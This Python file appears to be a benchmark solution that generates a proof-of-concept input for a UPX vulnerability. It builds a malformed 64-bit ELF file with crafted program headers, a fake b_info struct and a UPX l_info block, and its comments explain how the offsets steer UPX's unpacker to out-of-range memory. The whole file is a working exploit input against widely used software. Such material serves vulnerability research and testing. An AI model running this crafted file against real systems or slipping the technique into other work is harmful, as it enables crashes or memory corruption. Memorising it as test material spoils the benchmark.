import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        poc = bytearray(512)

        # ELF Header (64-bit)
        ehdr_format = "<16sHHIQQQIHHHHHH"
        ehdr = struct.pack(
            ehdr_format,
            b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00', # e_ident
            3,          # e_type = ET_DYN
            62,         # e_machine = EM_X86_64
            1,          # e_version
            0,          # e_entry
            0x40,       # e_phoff
            0,          # e_shoff
            0,          # e_flags
            64,         # e_ehsize
            56,         # e_phentsize
            2,          # e_phnum
            64,         # e_shentsize
            0,          # e_shnum
            0           # e_shstrndx
        )
        poc[0:len(ehdr)] = ehdr

        # Program Header 1 (Setup Header)
        phdr_format = "<IIQQQQQQ"
        phdr1 = struct.pack(
            phdr_format,
            1,                  # p_type = PT_LOAD
            5,                  # p_flags = R+X
            0xB0,               # p_offset
            0x1000,             # p_vaddr
            0x1000,             # p_paddr
            0x1,                # p_filesz > 0
            0xFFFFFFFF,         # p_memsz (large to make range check pass)
            0x1000              # p_align
        )
        poc[0x40:0x40+len(phdr1)] = phdr1

        # Program Header 2 (Trigger Header)
        phdr2 = struct.pack(
            phdr_format,
            1,                  # p_type = PT_LOAD
            5,                  # p_flags = R+X
            0,                  # p_offset
            0x800000,           # p_vaddr (large, to create large xct_off)
            0,                  # p_paddr
            0,                  # p_filesz
            0,                  # p_memsz
            0x1000              # p_align
        )
        poc[0x78:0x78+len(phdr2)] = phdr2

        # Fake b_info struct's method field at offset 0x100
        # struct b_info_t { unsigned b_uncompsize, b_compsize, b_method; }
        # The value 5 corresponds to M_LZMA.
        poc[0x100 + 8: 0x100 + 12] = struct.pack("<I", 5)

        # l_info block at the end of the file.
        l_info_size = 40
        l_info_block_start = 512 - l_info_size # 0x1D8

        # Header for the l_info block
        l_info_size_hdr = struct.pack("<II", l_info_size, 0) # size, checksum
        poc[l_info_block_start : l_info_block_start+8] = l_info_size_hdr
        
        # The l_info struct itself starts 8 bytes into the block.
        l_info_struct_start = l_info_block_start + 8 # 0x1E0

        # We set l_b_info_offset to 0x78. This value is an absolute file offset.
        # UPX calculates an internal offset `LBO` as:
        # LBO = (value_from_file) - l_info_size
        # The file is then accessed at: phdr1.p_offset + LBO
        # phdr1.p_offset + (0x78 - 40) = 0xB0 + (120 - 40) = 176 + 80 = 256 = 0x100
        # This points to our fake b_info.
        b_info_offset_value = 0x78
        p_info_offset_value = 0x78 # Can be anything, unused in this path.

        # The offsets are at the end of the 32-byte l_info struct.
        l_info_struct_p_info_off = l_info_struct_start + 24
        l_info_struct_b_info_off = l_info_struct_start + 28
        
        poc[l_info_struct_p_info_off : l_info_struct_p_info_off + 4] = struct.pack("<i", p_info_offset_value)
        poc[l_info_struct_b_info_off : l_info_struct_b_info_off + 4] = struct.pack("<i", b_info_offset_value)

        # UPX magic at the start of the l_info struct ("UPX!")
        poc[l_info_struct_start : l_info_struct_start + 4] = struct.pack("<I", 0x21585055)

        return bytes(poc)
